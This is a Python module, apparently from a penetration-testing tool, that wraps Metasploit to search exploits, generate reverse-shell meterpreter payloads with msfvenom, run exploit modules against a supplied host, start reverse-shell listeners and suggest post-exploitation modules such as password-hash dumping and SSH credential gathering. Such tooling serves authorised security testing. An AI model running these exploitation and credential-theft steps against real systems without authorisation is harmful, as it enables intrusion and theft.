"""
Metasploit Framework Integration Module
Provides integration with Metasploit for advanced exploitation capabilities
"""

import os
import json
import subprocess
import tempfile
import time
from typing import Dict, List, Optional, Tuple
from colorama import Fore, Style
from utils.output_formatter import OutputFormatter
from metasploit_modules.module_database import MetasploitModuleDatabase

class MetasploitIntegration:
    def __init__(self):
        self.output = OutputFormatter()
        self.msfconsole_path = self.find_msfconsole()
        self.available = self.check_metasploit_availability()
        self.module_db = MetasploitModuleDatabase()
        self.output.print_info(f"Loaded {self.module_db.get_statistics()['total_modules']} Metasploit modules")
        
    def find_msfconsole(self) -> Optional[str]:
        """Find msfconsole executable path"""
        common_paths = [
            '/usr/bin/msfconsole',
            '/opt/metasploit-framework/bin/msfconsole',
            '/opt/metasploit/bin/msfconsole',
            'msfconsole'  # In PATH
        ]
        
        for path in common_paths:
            try:
                result = subprocess.run([path, '--version'], 
                                     capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    return path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
                
        return None
        
    def check_metasploit_availability(self) -> bool:
        """Check if Metasploit Framework is available"""
        if not self.msfconsole_path:
            return False
            
        try:
            result = subprocess.run([self.msfconsole_path, '--version'], 
                                 capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except Exception:
            return False
            
    def get_version(self) -> Optional[str]:
        """Get Metasploit Framework version"""
        if not self.available:
            return None
            
        try:
            result = subprocess.run([self.msfconsole_path, '--version'], 
                                 capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return None
        
    def search_exploits(self, service: str, version: str = None) -> List[Dict]:
        """Search for relevant exploits based on service and version"""
        if not self.available:
            return []
            
        search_term = service
        if version:
            search_term += f" {version}"
            
        try:
            # Create resource script for searching
            script_content = f"""
search {search_term}
exit
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(script_content)
                script_path = f.name
                
            # Execute search
            result = subprocess.run(
                [self.msfconsole_path, '-q', '-r', script_path],
                capture_output=True, text=True, timeout=30
            )
            
            os.unlink(script_path)
            
            if result.returncode == 0:
                return self.parse_search_results(result.stdout)
                
        except Exception as e:
            self.output.print_error(f"Error searching exploits: {str(e)}")
            
        return []
        
    def parse_search_results(self, output: str) -> List[Dict]:
        """Parse Metasploit search results"""
        exploits = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('=') or 'Matching Modules' in line:
                continue
                
            # Parse exploit entries
            if 'exploit/' in line:
                parts = line.split()
                if len(parts) >= 3:
                    exploit = {
                        'module': parts[0],
                        'disclosure_date': parts[1] if parts[1] != '' else 'Unknown',
                        'rank': parts[2] if len(parts) > 2 else 'Unknown',
                        'name': ' '.join(parts[3:]) if len(parts) > 3 else 'Unknown',
                        'type': 'exploit'
                    }
                    exploits.append(exploit)
                    
        return exploits
        
    def get_exploit_info(self, module_name: str) -> Optional[Dict]:
        """Get detailed information about a specific exploit module"""
        if not self.available:
            return None
            
        try:
            script_content = f"""
use {module_name}
info
exit
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(script_content)
                script_path = f.name
                
            result = subprocess.run(
                [self.msfconsole_path, '-q', '-r', script_path],
                capture_output=True, text=True, timeout=30
            )
            
            os.unlink(script_path)
            
            if result.returncode == 0:
                return self.parse_exploit_info(result.stdout)
                
        except Exception as e:
            self.output.print_error(f"Error getting exploit info: {str(e)}")
            
        return None
        
    def parse_exploit_info(self, output: str) -> Dict:
        """Parse exploit module information"""
        info = {
            'name': 'Unknown',
            'description': 'No description available',
            'author': [],
            'targets': [],
            'options': {},
            'references': []
        }
        
        lines = output.split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            
            if 'Name:' in line:
                info['name'] = line.split('Name:', 1)[1].strip()
            elif 'Description:' in line:
                current_section = 'description'
                info['description'] = line.split('Description:', 1)[1].strip()
            elif line.startswith('Author:'):
                current_section = 'author'
                authors = line.split('Author:', 1)[1].strip()
                info['author'] = [a.strip() for a in authors.split(',')]
            elif 'Basic options:' in line:
                current_section = 'options'
            elif 'Available targets:' in line:
                current_section = 'targets'
            elif current_section == 'description' and line and not line.startswith('Author:'):
                info['description'] += ' ' + line
                
        return info
        
    def generate_payload(self, target_os: str, target_arch: str = 'x86', 
                        lhost: str = None, lport: int = 4444) -> Optional[str]:
        """Generate a payload for the target system"""
        if not self.available:
            return None
            
        # Select appropriate payload based on target OS
        payload_map = {
            'windows': f'windows/{target_arch}/meterpreter/reverse_tcp',
            'linux': f'linux/{target_arch}/meterpreter/reverse_tcp',
            'osx': f'osx/{target_arch}/shell_reverse_tcp',
            'android': 'android/meterpreter/reverse_tcp'
        }
        
        payload = payload_map.get(target_os.lower(), 'generic/shell_reverse_tcp')
        
        try:
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LHOST={lhost or "127.0.0.1"}',
                f'LPORT={lport}',
                '--format', 'raw'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return result.stdout
                
        except Exception as e:
            self.output.print_error(f"Error generating payload: {str(e)}")
            
        return None
        
    def execute_exploit(self, module_name: str, target_host: str, 
                       options: Dict = None) -> Dict:
        """Execute an exploit module against a target"""
        if not self.available:
            return {'status': 'error', 'message': 'Metasploit not available'}
            
        try:
            # Build resource script
            script_lines = [
                f'use {module_name}',
                f'set RHOSTS {target_host}'
            ]
            
            # Add custom options
            if options:
                for key, value in options.items():
                    script_lines.append(f'set {key} {value}')
                    
            script_lines.extend([
                'check',
                'exploit',
                'exit'
            ])
            
            script_content = '\n'.join(script_lines)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(script_content)
                script_path = f.name
                
            # Execute exploit
            result = subprocess.run(
                [self.msfconsole_path, '-q', '-r', script_path],
                capture_output=True, text=True, timeout=120
            )
            
            os.unlink(script_path)
            
            return {
                'status': 'completed' if result.returncode == 0 else 'failed',
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def get_recommended_exploits(self, service_info: Dict) -> List[Dict]:
        """Get recommended exploits based on service information"""
        recommendations = []
        
        service_name = service_info.get('service', '').lower()
        version = service_info.get('version', '')
        port = service_info.get('port', '')
        
        # Common service exploit mappings
        exploit_mappings = {
            'ssh': ['auxiliary/scanner/ssh/ssh_login', 'exploit/linux/ssh/ssh_enum_users'],
            'ftp': ['auxiliary/scanner/ftp/ftp_login', 'exploit/unix/ftp/vsftpd_234_backdoor'],
            'telnet': ['auxiliary/scanner/telnet/telnet_login'],
            'smtp': ['auxiliary/scanner/smtp/smtp_enum', 'auxiliary/scanner/smtp/smtp_relay'],
            'http': ['auxiliary/scanner/http/dir_scanner', 'auxiliary/scanner/http/http_login'],
            'https': ['auxiliary/scanner/ssl/ssl_version', 'auxiliary/scanner/http/ssl_version'],
            'smb': ['auxiliary/scanner/smb/smb_login', 'exploit/windows/smb/ms17_010_eternalblue'],
            'mysql': ['auxiliary/scanner/mysql/mysql_login', 'auxiliary/scanner/mysql/mysql_version'],
            'mssql': ['auxiliary/scanner/mssql/mssql_login', 'auxiliary/admin/mssql/mssql_enum'],
            'rdp': ['auxiliary/scanner/rdp/rdp_scanner', 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce']
        }
        
        # Get potential exploits for the service
        potential_exploits = exploit_mappings.get(service_name, [])
        
        for exploit in potential_exploits:
            exploit_info = self.get_exploit_info(exploit)
            if exploit_info:
                recommendations.append({
                    'module': exploit,
                    'info': exploit_info,
                    'confidence': 'high' if service_name in exploit else 'medium',
                    'reason': f'Common exploit for {service_name} service'
                })
                
        # Search for version-specific exploits
        if service_name and version:
            version_exploits = self.search_exploits(service_name, version)
            for exploit in version_exploits[:3]:  # Limit to top 3
                recommendations.append({
                    'module': exploit['module'],
                    'info': exploit,
                    'confidence': 'high',
                    'reason': f'Version-specific exploit for {service_name} {version}'
                })
                
        return recommendations
        
    def create_listener(self, payload_type: str = 'windows/meterpreter/reverse_tcp',
                       lhost: str = '0.0.0.0', lport: int = 4444) -> Dict:
        """Create a Metasploit listener for catching reverse shells"""
        if not self.available:
            return {'status': 'error', 'message': 'Metasploit not available'}
            
        try:
            script_content = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
jobs
exit
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(script_content)
                script_path = f.name
                
            result = subprocess.run(
                [self.msfconsole_path, '-q', '-r', script_path],
                capture_output=True, text=True, timeout=30
            )
            
            os.unlink(script_path)
            
            return {
                'status': 'completed' if result.returncode == 0 else 'failed',
                'output': result.stdout,
                'listener_info': {
                    'payload': payload_type,
                    'lhost': lhost,
                    'lport': lport
                }
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def get_post_exploitation_modules(self, session_type: str = 'meterpreter') -> List[str]:
        """Get list of post-exploitation modules"""
        post_modules = [
            'post/windows/gather/enum_system',
            'post/windows/gather/hashdump',
            'post/windows/gather/enum_domain',
            'post/windows/gather/credentials/windows_autologin',
            'post/linux/gather/enum_system',
            'post/linux/gather/hashdump',
            'post/multi/gather/env',
            'post/multi/gather/ssh_creds',
            'post/multi/recon/local_exploit_suggester'
        ]
        
        return post_modules
        
    def install_instructions(self) -> Dict:
        """Get Metasploit installation instructions"""
        return {
            'debian_ubuntu': [
                'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall',
                'chmod 755 msfinstall',
                './msfinstall'
            ],
            'centos_rhel': [
                'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall',
                'chmod 755 msfinstall',
                './msfinstall'
            ],
            'kali_linux': [
                'sudo apt-get update',
                'sudo apt-get install metasploit-framework'
            ],
            'docker': [
                'docker pull metasploitframework/metasploit-framework',
                'docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -p 4444:4444 metasploitframework/metasploit-framework'
            ]
        }
        
    def search_modules_by_service(self, service: str, version: str = None) -> List[Dict]:
        """Search modules using the integrated database"""
        try:
            # Use local module database for faster searches
            results = self.module_db.get_modules_by_service(service)
            
            # If version is specified, filter further
            if version and results:
                version_filtered = []
                for module in results:
                    if version.lower() in module['description'].lower() or version in module['name']:
                        version_filtered.append(module)
                return version_filtered
                
            return results[:20]  # Limit results
        except Exception as e:
            self.output.print_error(f"Error searching local modules: {str(e)}")
            return []
            
    def get_exploit_recommendations(self, target_info: Dict) -> Dict:
        """Get comprehensive exploit recommendations for a target"""
        recommendations = {
            'high_priority': [],
            'medium_priority': [],
            'reconnaissance': [],
            'post_exploitation': []
        }
        
        try:
            # Get recommendations from module database
            target_modules = self.module_db.recommend_modules_for_target(target_info)
            
            for module in target_modules:
                category = module['category']
                rank = module['rank'].lower()
                
                if category == 'exploits':
                    if rank in ['excellent', 'great']:
                        recommendations['high_priority'].append(module)
                    else:
                        recommendations['medium_priority'].append(module)
                elif category == 'auxiliary':
                    recommendations['reconnaissance'].append(module)
                elif category == 'post':
                    recommendations['post_exploitation'].append(module)
                    
            # Limit recommendations per category
            for key in recommendations:
                recommendations[key] = recommendations[key][:10]
                
        except Exception as e:
            self.output.print_error(f"Error getting recommendations: {str(e)}")
            
        return recommendations
        
    def get_cve_exploits(self, cve_list: List[str]) -> Dict:
        """Get exploits for specific CVEs"""
        cve_exploits = {}
        
        for cve in cve_list:
            try:
                exploits = self.module_db.get_modules_by_cve(cve)
                if exploits:
                    cve_exploits[cve] = exploits
            except Exception:
                continue
                
        return cve_exploits
        
    def generate_exploitation_plan(self, target_info: Dict) -> Dict:
        """Generate a comprehensive exploitation plan"""
        plan = {
            'target_analysis': target_info,
            'reconnaissance_modules': [],
            'vulnerability_scanners': [],
            'exploits': [],
            'post_exploitation': [],
            'estimated_success_rate': 'Unknown'
        }
        
        try:
            # Get service-specific modules
            services = target_info.get('services', [])
            for service in services:
                service_modules = self.search_modules_by_service(service)
                
                for module in service_modules:
                    category = module['category']
                    if category == 'auxiliary' and 'scan' in module['path']:
                        plan['reconnaissance_modules'].append(module)
                    elif category == 'exploits':
                        plan['exploits'].append(module)
                    elif category == 'post':
                        plan['post_exploitation'].append(module)
                        
            # Estimate success rate based on available exploits
            high_rank_exploits = [e for e in plan['exploits'] 
                                if e['rank'].lower() in ['excellent', 'great']]
            
            if len(high_rank_exploits) >= 3:
                plan['estimated_success_rate'] = 'High'
            elif len(high_rank_exploits) >= 1:
                plan['estimated_success_rate'] = 'Medium'
            elif len(plan['exploits']) > 0:
                plan['estimated_success_rate'] = 'Low'
            else:
                plan['estimated_success_rate'] = 'Very Low'
                
            # Limit plan components
            plan['reconnaissance_modules'] = plan['reconnaissance_modules'][:5]
            plan['exploits'] = plan['exploits'][:10]
            plan['post_exploitation'] = plan['post_exploitation'][:5]
            
        except Exception as e:
            self.output.print_error(f"Error generating exploitation plan: {str(e)}")
            
        return plan
        
    def get_module_statistics(self) -> Dict:
        """Get statistics about available modules"""
        try:
            return self.module_db.get_statistics()
        except Exception as e:
            self.output.print_error(f"Error getting module statistics: {str(e)}")
            return {}
            
    def export_module_database(self, filename: str = None) -> bool:
        """Export module database to file"""
        try:
            if not filename:
                filename = f"vapt_metasploit_modules_{int(time.time())}.json"
                
            self.module_db.export_database(filename)
            self.output.print_success(f"Module database exported to {filename}")
            return True
        except Exception as e:
            self.output.print_error(f"Error exporting database: {str(e)}")
            return False
            
    def search_by_platform(self, platform: str) -> List[Dict]:
        """Search modules by target platform"""
        try:
            return self.module_db.get_modules_by_platform(platform)
        except Exception as e:
            self.output.print_error(f"Error searching by platform: {str(e)}")
            return []
            
    def get_recent_exploits(self, year: int = 2023) -> List[Dict]:
        """Get recently disclosed exploits"""
        try:
            return self.module_db.get_recent_modules(year)
        except Exception as e:
            self.output.print_error(f"Error getting recent exploits: {str(e)}")
            return []